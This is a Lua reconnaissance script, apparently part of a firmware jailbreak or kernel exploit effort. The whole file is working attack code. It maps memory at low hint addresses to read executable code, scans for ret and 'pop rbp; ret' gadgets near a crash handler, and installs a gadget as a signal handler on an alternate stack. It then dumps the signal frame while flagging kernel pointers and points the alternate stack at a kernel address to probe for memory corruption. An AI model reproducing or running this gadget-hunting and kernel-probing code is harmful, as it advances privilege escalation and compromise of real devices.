-- 14.10 Recon Probe 26e: Read code segment to find ret gadget
-- Problem: heap (0x310xxx) > code (0x53xxx), so offset is negative
-- Pointer + negative offset crashes
-- Fix: mmap at a LOW hint address to get a base below code,
-- then use positive offset to read code bytes

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: CODE READ ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_mmap = 477,
    sc_munmap = 73,
    sc_sigaction = 416,
    sc_sigaltstack = 53,
    sc_kill = 37,
    sc_getpid = 20,
})

local pid = syscall.sc_getpid():tonumber()
local PROT_READ = 1
local PROT_WRITE = 2
local MAP_PRIVATE = 2
local MAP_ANON = 0x1000

-- ============================================================
-- PART 1: Try mmap with low hint addresses
-- ============================================================
log("")
log("--- PART 1: low mmap hints ---")

-- Try several low hints — kernel may or may not honor them
local hints = {0x10000, 0x100000, 0x1000000, 0x10000000, 0x20000000}
local low_ptr = nil
local low_addr = nil

for _, hint in ipairs(hints) do
    local ok, ptr = pcall(function()
        return syscall.sc_mmap(hint, 4096, PROT_READ + PROT_WRITE,
            MAP_PRIVATE + MAP_ANON, -1, 0)
    end)
    if ok then
        local addr = ptr:tonumber()
        log(string.format("  hint 0x%x → 0x%x", hint, addr))
        if addr > 0 and addr < 0x533118f4 then
            if not low_ptr or addr < low_addr then
                low_ptr = ptr
                low_addr = addr
            end
        end
        -- Unmap if not useful
        if addr >= 0x533118f4 then
            pcall(function() syscall.sc_munmap(ptr, 4096) end)
        end
    end
end

if low_ptr then
    log(string.format("  best low ptr: 0x%x", low_addr))
    local code_target = 0x533118f4
    local offset = code_target - low_addr
    log(string.format("  offset to crash handler: 0x%x (%d)", offset, offset))

    -- Try reading from code
    local rd_ok, rd_val = pcall(function()
        return memory.read_byte(low_ptr + offset):tonumber()
    end)
    log("  read crash_handler[0]: " ..
        (rd_ok and string.format("0x%02x", rd_val) or "FAIL"))

    if rd_ok then
        log("  *** CODE READABLE ***")

        -- Scan for ret (0xC3) near crash handler
        local rets = {}
        local scan_start = -32
        local scan_end = 1024

        for i = scan_start, scan_end do
            local s_ok, s_val = pcall(function()
                return memory.read_byte(low_ptr + offset + i):tonumber()
            end)
            if s_ok and s_val == 0xC3 then
                rets[#rets+1] = {off = i, addr = code_target + i}
            end
        end

        log("  found " .. #rets .. " ret instructions in range")
        for idx, r in ipairs(rets) do
            if idx <= 10 then
                -- Check preceding byte for epilogue pattern
                local pre_ok, pre_val = pcall(function()
                    return memory.read_byte(low_ptr + offset + r.off - 1):tonumber()
                end)
                local pattern = ""
                if pre_ok then
                    if pre_val == 0x5D then pattern = " (pop rbp;ret)"
                    elseif pre_val == 0xC9 then pattern = " (leave;ret)"
                    elseif pre_val == 0x90 then pattern = " (nop;ret)"
                    elseif pre_val == 0xC3 then pattern = " (ret;ret)"
                    end
                end
                log(string.format("    0x%x (handler%+d)%s",
                    r.addr, r.off, pattern))
            end
        end

        -- Dump first 32 bytes of crash handler for context
        log("")
        log("  crash handler bytes:")
        local hex = {}
        for i = 0, 31 do
            local b_ok, b_val = pcall(function()
                return memory.read_byte(low_ptr + offset + i):tonumber()
            end)
            if b_ok then hex[#hex+1] = string.format("%02x", b_val) end
        end
        log("  " .. table.concat(hex, " "))

        -- ============================================================
        -- PART 2: Test first clean ret gadget as signal handler
        -- Prefer "pop rbp; ret" or standalone "ret"
        -- ============================================================
        if #rets > 0 then
            log("")
            log("--- PART 2: test ret gadget ---")

            -- Pick best gadget: prefer standalone ret or pop rbp;ret
            local best = rets[1]
            for _, r in ipairs(rets) do
                local pre_ok, pre_val = pcall(function()
                    return memory.read_byte(low_ptr + offset + r.off - 1):tonumber()
                end)
                if pre_ok and pre_val == 0x5D then
                    best = r -- pop rbp; ret is a clean epilogue
                    break
                end
            end

            log(string.format("  using gadget at 0x%x", best.addr))

            local STACK_SZ = 32768
            local test_stack = memory.alloc(STACK_SZ)
            for i = 0, STACK_SZ - 4, 4 do
                memory.write_dword(test_stack + i, 0x77770000 + i)
            end

            local ss_new = memory.alloc(32)
            local ss_old = memory.alloc(32)
            memory.write_qword(ss_new, test_stack)
            memory.write_qword(ss_new + 8, STACK_SZ)
            memory.write_dword(ss_new + 16, 0)
            pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

            local sa_new = memory.alloc(64)
            local sa_old = memory.alloc(64)
            for i = 0, 63, 8 do memory.write_qword(sa_new + i, 0) end
            local g_lo = best.addr % 0x100000000
            local g_hi = math.floor(best.addr / 0x100000000)
            memory.write_dword(sa_new, g_lo)
            memory.write_dword(sa_new + 4, g_hi)
            memory.write_dword(sa_new + 8, 0x0001 + 0x0040) -- SA_ONSTACK|SA_SIGINFO
            pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)

            log("  sending SIGUSR1...")
            local k_ok, k_ret = pcall(function()
                return syscall.sc_kill(pid, 30)
            end)
            log("  kill rv=" .. (k_ok and tostring(k_ret:tonumber()) or "ERR"))

            local alive = pcall(function() return syscall.sc_getpid() end)
            log("  alive: " .. tostring(alive))

            if alive then
                local modified = 0
                local first_mod = -1
                for i = 0, STACK_SZ - 4, 4 do
                    local v = memory.read_dword(test_stack + i):tonumber()
                    if v ~= 0x77770000 + i then
                        modified = modified + 1
                        if first_mod < 0 then first_mod = i end
                    end
                end
                log("  altstack modified: " .. modified)

                if modified > 0 then
                    log("  *** CLEAN RET WORKS — FRAME ON ALTSTACK ***")
                    log(string.format("  frame at +%d", first_mod))

                    -- Dump frame for kernel pointers
                    for i = first_mod, math.min(first_mod + 320, STACK_SZ - 8), 8 do
                        local lo = memory.read_dword(test_stack + i):tonumber()
                        local hi = memory.read_dword(test_stack + i + 4):tonumber()
                        if hi ~= 0x77770000 + i + 4 or lo ~= 0x77770000 + i then
                            local tag = ""
                            if hi >= 0xFFFF0000 then tag = " ***KPTR***" end
                            log(string.format("    +%04x: 0x%08x%08x%s",
                                i, hi, lo, tag))
                        end
                    end

                    -- PART 3: KERNEL ALTSTACK
                    log("")
                    log("--- PART 3: KERNEL ALTSTACK ---")
                    memory.write_dword(ss_new + 16, 4)
                    pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

                    memory.write_dword(ss_new, 0x10000000)
                    memory.write_dword(ss_new + 4, 0xFFFFF800)
                    memory.write_qword(ss_new + 8, STACK_SZ)
                    memory.write_dword(ss_new + 16, 0)
                    pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

                    log("  *** KERNEL ALTSTACK SIGNAL ***")
                    local k2_ok, k2_ret = pcall(function()
                        return syscall.sc_kill(pid, 30)
                    end)
                    log("  kill rv=" ..
                        (k2_ok and tostring(k2_ret:tonumber()) or "ERR"))

                    local alive2 = pcall(function() return syscall.sc_getpid() end)
                    log("  alive: " .. tostring(alive2))

                    memory.write_dword(ss_new + 16, 4)
                    pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
                end
            end

            -- Cleanup
            for i = 0, 63, 8 do memory.write_qword(sa_new + i, 0) end
            pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)
            memory.write_dword(ss_new + 16, 4)
            pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
        end
    end
else
    log("  all mmap hints returned addresses above code")
    log("  trying MAP_FIXED at 0x10000000...")
    local MAP_FIXED = 0x0010
    local fix_ok, fix_ptr = pcall(function()
        return syscall.sc_mmap(0x10000000, 4096, PROT_READ + PROT_WRITE,
            MAP_PRIVATE + MAP_ANON + MAP_FIXED, -1, 0)
    end)
    if fix_ok then
        log(string.format("  MAP_FIXED: 0x%x", fix_ptr:tonumber()))
    else
        log("  MAP_FIXED failed")
    end
end

log("")
log("=== CODE READ DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
